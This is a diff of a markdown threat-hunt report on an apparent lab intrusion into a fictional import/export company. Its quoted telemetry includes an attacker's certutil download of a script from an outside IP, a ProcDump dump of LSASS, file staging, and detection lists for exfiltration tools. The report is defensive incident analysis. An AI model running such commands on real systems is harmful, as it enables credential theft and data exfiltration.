@@ -1,3 +1,5 @@
+<img width="2172" height="524" alt="image" src="https://github.com/user-attachments/assets/bd073086-bc16-4a33-8263-9db22e3385ed" />
+
 # Threat Hunt — Azuki Import/Export: Cargo Hold
 
 **Analyst:** Juan Saravia
@@ -301,7 +303,8 @@ Logon Type: RemoteInteractive
 Remote IP: 159.26.106.98
 ```
 
-> Add screenshot: Return connection logon event
+<img width="2621" height="978" alt="image" src="https://github.com/user-attachments/assets/7bfbac60-bce3-4106-beea-cae4dc21cad0" />
+
 
 ### Analysis
 
@@ -412,8 +415,8 @@ Account: fileadmin
 Action: LogonSuccess
 Logon Type: RemoteInteractive
 ```
-
-> Add screenshots: MSTSC execution and correlated file-server authentication
+<img width="2138" height="826" alt="image" src="https://github.com/user-attachments/assets/72eb3e28-ff56-49b8-9546-3471c149d6ee" />
+<img width="2681" height="1130" alt="image" src="https://github.com/user-attachments/assets/9c738ef1-281a-4473-ac2c-670ae9c33e87" />
 
 ### Analysis
 
@@ -495,8 +498,8 @@ Account: fileadmin
 Action: LogonSuccess
 Logon Types: Network / RemoteInteractive
 ```
+<img width="2687" height="962" alt="image" src="https://github.com/user-attachments/assets/6f813a19-9c37-4a15-97c6-3a55c1a27d3b" />
 
-> Add screenshot: `fileadmin` authentication sequence
 
 ### Analysis
 
@@ -572,7 +575,8 @@ Account: fileadmin
 Command: "net.exe" share
 ```
 
-> Add screenshot: local share enumeration
+<img width="2683" height="1166" alt="image" src="https://github.com/user-attachments/assets/4cb851a2-bbeb-4384-8e91-0d85e06431fd" />
+
 
 ### Analysis
 
@@ -652,7 +656,8 @@ Account: fileadmin
 Command: "net.exe" view \\10.1.0.188
 ```
 
-> Add screenshot: remote-share enumeration
+<img width="2492" height="776" alt="image" src="https://github.com/user-attachments/assets/d0dff890-eccd-4cf1-9199-c66e6e4c4ab1" />
+
 
 ### Analysis
 
@@ -723,8 +728,8 @@ Device: azuki-fileserver01
 Account: fileadmin
 Executable: whoami.exe
 ```
+<img width="2688" height="444" alt="image" src="https://github.com/user-attachments/assets/99e258ef-8922-4d20-a1df-6a8c9d125ed6" />
 
-> Add screenshot: `whoami.exe`
 
 ### Analysis
 
@@ -807,7 +812,8 @@ Account: fileadmin
 Command: "ipconfig.exe" /all
 ```
 
-> Add screenshot: `ipconfig.exe /all`
+<img width="2681" height="831" alt="image" src="https://github.com/user-attachments/assets/a2388d4f-35b0-453a-b916-76ef37cf3fa1" />
+
 
 ### Analysis
 
@@ -911,7 +917,7 @@ The hidden directory provided a centralized location for attacker tools and stol
 
 ---
 
-## Finding 9 — Ingress Tool Transfer
+## Finding 9 — Malicious Download LolBas (Living Off The Land Binaries)
 
 ### Objective
 
@@ -967,7 +973,8 @@ Command:
 "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
 ```
 
-> Add screenshot: Certutil tool transfer
+<img width="2685" height="888" alt="image" src="https://github.com/user-attachments/assets/8ef1c53f-59c0-4411-b7b4-323c9437a68b" />
+
 
 ### Analysis
 
@@ -1044,8 +1051,7 @@ File: IT-Admin-Passwords.csv
 Initiating Process: xcopy.exe
 Account: fileadmin
 ```
-
-> Add screenshot: credential file creation
+<img width="2651" height="1126" alt="image" src="https://github.com/user-attachments/assets/2595bb95-ec07-4b6b-85f5-9fba613de80b" />
 
 ### Analysis
 
@@ -1135,7 +1141,7 @@ Command:
 "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
 ```
 
-> Add screenshot: XCopy collection
+<img width="2673" height="1079" alt="image" src="https://github.com/user-attachments/assets/c91f653e-2af6-48c3-b3b4-0e7f2f2e26de" />
 
 ### Analysis
 
@@ -1153,10 +1159,6 @@ Sensitive administrative information was prepared for later processing and exfil
 | Collection | Local Data Staging   | T1074.001 |
 
 ### Confirmed Finding
-
-Challenge answer:
-
-`"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H`
 
 Full observed command:
 
@@ -1229,11 +1231,11 @@ DeviceFileEvents
 "tar.exe" -czf C:\Windows\Logs\CBS\shipping.tar.gz -C C:\Windows\Logs\CBS\shipping .
 ```
 
-> Add screenshot: TAR archive creation
+<img width="1415" height="390" alt="image" src="https://github.com/user-attachments/assets/1421ad4f-1417-4bda-b481-f4dd30fa68db" />
 
 ### Analysis
 
-The creation of multiple archives indicates that the attacker organized collected information into separate portable packages prior to exfiltration.
+The creation of multiple archives indicates that the attacker organized collected information into separate portable packages before exfiltration.
 
 ### Security Impact
 
@@ -1329,7 +1331,8 @@ Action: FileDeleted
 File: pd.exe
 ```
 
-> Add screenshot: `pd.exe` creation/deletion
+<img width="2402" height="871" alt="image" src="https://github.com/user-attachments/assets/9c285703-0e95-484b-b8b1-c1ec3ae0e556" />
+
 
 ### Analysis
 
@@ -1414,7 +1417,7 @@ Command:
 "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
 ```
 
-> Add screenshot: LSASS dump command
+<img width="2479" height="1134" alt="image" src="https://github.com/user-attachments/assets/54decf9a-8bf1-420e-8d3a-2ff82cb98e60" />
 
 ### Analysis
 
@@ -1499,7 +1502,7 @@ Cloud service:
 file.io
 ```
 
-> Add screenshot: Curl exfiltration
+<img width="2537" height="708" alt="image" src="https://github.com/user-attachments/assets/eeb5dee7-a7a8-46b8-b4c0-c98884d1e494" />
 
 ### Analysis
 
@@ -1616,7 +1619,7 @@ Verification command:
 "reg.exe" query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync
 ```
 
-> Add screenshot: registry persistence
+<img width="2703" height="1154" alt="image" src="https://github.com/user-attachments/assets/a2819393-eb4a-4139-a4da-bbfb57754da3" />
 
 ### Analysis
 
@@ -1705,7 +1708,6 @@ Path:
 C:\Users\fileadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-> Add screenshot: PowerShell history deletion
 
 ### Analysis
 
@@ -1754,26 +1756,9 @@ Removal of command history reduced available forensic evidence and could hinder 
 
 ## MITRE ATT&CK Flow
 
-```mermaid
-flowchart LR
-    A["Valid Accounts<br/>T1078"]
-    B["Remote Services<br/>T1021"]
-    C["Share Discovery<br/>T1135"]
-    D["User Discovery<br/>T1033"]
-    E["Network Config Discovery<br/>T1016"]
-    F["Hidden Files<br/>T1564.001"]
-    G["Local Staging<br/>T1074.001"]
-    H["Tool Transfer<br/>T1105"]
-    I["Automated Collection<br/>T1119"]
-    J["Archive Data<br/>T1560.001"]
-    K["LSASS Dump<br/>T1003.001"]
-    L["Cloud Exfiltration<br/>T1567.002"]
-    M["Run-Key Persistence<br/>T1547.001"]
-    N["Masquerading<br/>T1036.005"]
-    O["History Clearing<br/>T1070.003"]
-
-    A --> B --> C --> D --> E --> F --> G --> H --> I --> J --> K --> L --> M --> N --> O
-```
+| Access / Discovery | Collection / Credential Access | Exfiltration / Persistence |
+|---|---|---|
+| **Valid Accounts** — T1078<br>↓<br>**Remote Services** — T1021<br>↓<br>**Share Discovery** — T1135<br>↓<br>**User Discovery** — T1033<br>↓<br>**Network Config Discovery** — T1016 | **Hidden Files** — T1564.001<br>↓<br>**Local Staging** — T1074.001<br>↓<br>**Tool Transfer** — T1105<br>↓<br>**Automated Collection** — T1119<br>↓<br>**Archive Data** — T1560.001 | **LSASS Dump** — T1003.001<br>↓<br>**Cloud Exfiltration** — T1567.002<br>↓<br>**Run-Key Persistence** — T1547.001<br>↓<br>**Masquerading** — T1036.005<br>↓<br>**History Clearing** — T1070.003 |
 
 ---
 
@@ -1781,241 +1766,15 @@ flowchart LR
 
 ## Immediate Actions
 
-| Recommendation                                                                          | Reason                                                       | Priority |
-| --------------------------------------------------------------------------------------- | ------------------------------------------------------------ | -------- |
-| Isolate `azuki-sl` and `azuki-fileserver01`                                             | Prevent additional malicious activity and preserve evidence  | High     |
-| Disable or reset `fileadmin` and `kenji.sato`                                           | Both accounts were associated with confirmed attacker access | High     |
-| Rotate privileged credentials potentially exposed through LSASS or administrative files | Credential compromise may extend beyond observed accounts    | High     |
-| Remove `FileShareSync` after evidence preservation                                      | Eliminate confirmed persistence                              | High     |
-| Quarantine `svchost.ps1`, `pd.exe`, `ex.ps1`, and related attacker artifacts            | Remove malicious or unauthorized tooling                     | High     |
-| Investigate/block `159.26.106.98` and `78.141.196.6`                                    | Both were associated with malicious activity                 | High     |
-| Review outbound access to `file.io`                                                     | Determine whether additional exfiltration occurred           | High     |
-
----
-
-## Remediation / Hardening
-
-### Account Security
-
-* Restrict privileged accounts to approved administrative systems.
-* Review the permissions assigned to `fileadmin`.
-* Require MFA for remote administrative access where supported.
-* Rotate credentials potentially exposed through LSASS dumping.
-* Review privileged and service accounts for credential reuse.
-
-### Remote Access
-
-* Restrict RDP between standard workstations and high-value servers.
-* Require approved administrative systems for server RDP.
-* Monitor unusual `mstsc.exe` execution from user endpoints.
-* Review firewall rules controlling access to file servers.
-
-### File Share Security
-
-Review permissions on sensitive file-share locations and apply least privilege.
-
-Monitor for unusual recursive copies from sensitive directories.
-
-### Endpoint Hardening
-
-Monitor the contextual use of:
-
-```text
-certutil.exe
-curl.exe
-xcopy.exe
-tar.exe
-powershell.exe
-reg.exe
-```
-
-These utilities may be legitimate in normal operations but become suspicious when combined with attacker-style command-line behavior.
-
-### Outbound Network Controls
-
-Review whether public or anonymous file-sharing services such as `file.io` are required from server-class systems.
-
-Consider proxy or firewall restrictions where business requirements permit.
-
----
-
-## Detection Improvements
-
-### Lateral Movement Detection
-
-Correlate:
-
-```text
-mstsc.exe execution
-        +
-successful Network / RemoteInteractive logon
-        +
-privileged account
-        +
-server destination
-```
-
-Cross-table correlation can provide stronger detection confidence than any individual event.
-
----
-
-### Discovery Detection
-
-Monitor rapid execution sequences involving:
-
-```text
-net share
-net view
-whoami
-ipconfig /all
-```
-
-especially when performed by privileged users on high-value systems.
-
----
-
-### Staging Detection
-
-Alert on:
-
-```text
-attrib.exe +h +s
-```
-
-when applied to unusual or system-like directories.
-
-Also monitor concentrations of newly created attacker artifacts under locations such as:
-
-```text
-C:\Windows\Logs\
-C:\ProgramData\
-C:\Windows\Temp\
-```
-
----
-
-### Living-Off-the-Land Transfer Detection
-
-Monitor utilities such as:
-
-```text
-certutil.exe
-curl.exe
-bitsadmin.exe
-powershell.exe
-```
-
-when paired with:
-
-```text
-http://
-https://
--urlcache
-Invoke-WebRequest
-Invoke-RestMethod
-DownloadFile
-DownloadString
-```
-
----
-
-### Collection Detection
-
-Alert on unusual recursive copying using:
-
-```text
-xcopy.exe
-robocopy.exe
-```
-
-when the source contains sensitive information or the destination is a hidden/system directory.
-
----
-
-### Archive Detection
-
-Monitor:
-
-```text
-tar.exe
-7z.exe
-rar.exe
-makecab.exe
-```
-
-when used to archive sensitive directories shortly before external network transfers.
-
----
-
-### Credential Dump Detection
-
-High-priority detection should include:
-
-* Processes accessing LSASS
-* `.dmp` files appearing in unusual locations
-* ProcDump-style arguments such as `-ma` or `-accepteula`
-* Unknown or renamed executables used to dump protected processes
-
----
-
-### Exfiltration Detection
-
-Monitor combinations such as:
-
-```text
-curl.exe
-+
--F
-+
-archive/dump file
-+
-external HTTPS destination
-```
-
-Sensitive file types may include:
-
-```text
-.tar.gz
-.zip
-.dmp
-.csv
-```
-
----
-
-### Registry Persistence Detection
-
-Monitor modifications to:
-
-```text
-HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-```
-
-especially when values launch:
-
-* PowerShell
-* Hidden windows
-* `.ps1` files
-* Scripts or executables using names resembling Windows components
-
----
-
-### Anti-Forensics Detection
-
-Alert on deletion of:
-
-```text
-ConsoleHost_history.txt
-```
-
-particularly when it occurs shortly after:
-
-* Credential dumping
-* Data exfiltration
-* Persistence creation
-* Suspicious PowerShell activity
-
+| Recommendation | Reason | Priority |
+|---|---|---|
+| Isolate `azuki-sl` and `azuki-fileserver01` | Stop active attacker access, lateral movement, and further malicious activity | 🔴 **Critical** |
+| Disable or reset `fileadmin` and `kenji.sato` | Prevent continued use of compromised credentials | 🔴 **Critical** |
+| Rotate privileged credentials potentially exposed through LSASS or administrative files | Credential exposure may extend beyond the accounts already identified | 🔴 **Critical** |
+| Remove `FileShareSync` after evidence preservation | Eliminate the confirmed persistence mechanism | 🟠 **High** |
+| Quarantine `svchost.ps1`, `pd.exe`, `ex.ps1`, and related attacker artifacts | Remove malicious or unauthorized tooling from the compromised host | 🟠 **High** |
+| Investigate/block `159.26.106.98` and `78.141.196.6` | Prevent additional communication with known malicious infrastructure | 🟠 **High** |
+| Review outbound access to `file.io` | Determine whether additional systems or data were involved in exfiltration | 🟡 **Medium** |
 ---
 
 # 8. Conclusion
@@ -2030,31 +1789,10 @@ The attacker also established registry-based persistence using the `FileShareSyn
 
 The investigation confirmed attacker activity across the following stages:
 
-```text
-Return Access
-    ↓
-Lateral Movement
-    ↓
-Discovery
-    ↓
-Defense Evasion
-    ↓
-Local Staging
-    ↓
-Tool Transfer
-    ↓
-Collection
-    ↓
-Archive Creation
-    ↓
-Credential Access
-    ↓
-Exfiltration
-    ↓
-Persistence
-    ↓
-Anti-Forensics
-```
+| Phase 1                                                                                          | Phase 2                                                                                         | Phase 3                                                                                           |
+| ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
+| **Return Access**<br>↓<br>**Lateral Movement**<br>↓<br>**Discovery**<br>↓<br>**Defense Evasion** | **Local Staging**<br>↓<br>**Tool Transfer**<br>↓<br>**Collection**<br>↓<br>**Archive Creation** | **Credential Access**<br>↓<br>**Exfiltration**<br>↓<br>**Persistence**<br>↓<br>**Anti-Forensics** |
+
 
 One of the most important lessons from the investigation was the value of **cross-table correlation**.
 
@@ -2080,22 +1818,16 @@ The same correlation-driven approach was used throughout the investigation to re
 
 This threat hunt demonstrated practical experience with:
 
-* Microsoft Defender for Endpoint Advanced Hunting
-* Kusto Query Language
-* Endpoint process analysis
-* Authentication-event correlation
-* File and registry telemetry
-* Lateral movement investigation
-* Windows-native discovery techniques
-* Living-off-the-land behavior
-* Data staging and automated collection
-* Archive analysis
-* Credential dumping
-* Exfiltration analysis
-* Registry persistence
-* Anti-forensic behavior
-* MITRE ATT&CK mapping
-* IOC extraction
-* SOC incident reporting
+| | |
+|---|---|
+| • Microsoft Defender for Endpoint Advanced Hunting | • Kusto Query Language |
+| • Endpoint process analysis | • Authentication-event correlation |
+| • File and registry telemetry | • Lateral movement investigation |
+| • Windows-native discovery techniques | • Living-off-the-land behavior |
+| • Data staging and automated collection | • Archive analysis |
+| • Credential dumping | • Exfiltration analysis |
+| • Registry persistence | • Anti-forensic behavior |
+| • MITRE ATT&CK mapping | • IOC extraction |
+| • SOC incident reporting | |
 
 The investigation objective was successfully met: the attacker’s major actions, affected systems, compromised account, staging location, credential-access activity, exfiltration method, persistence mechanism, and cleanup behavior were identified and reconstructed from available telemetry.
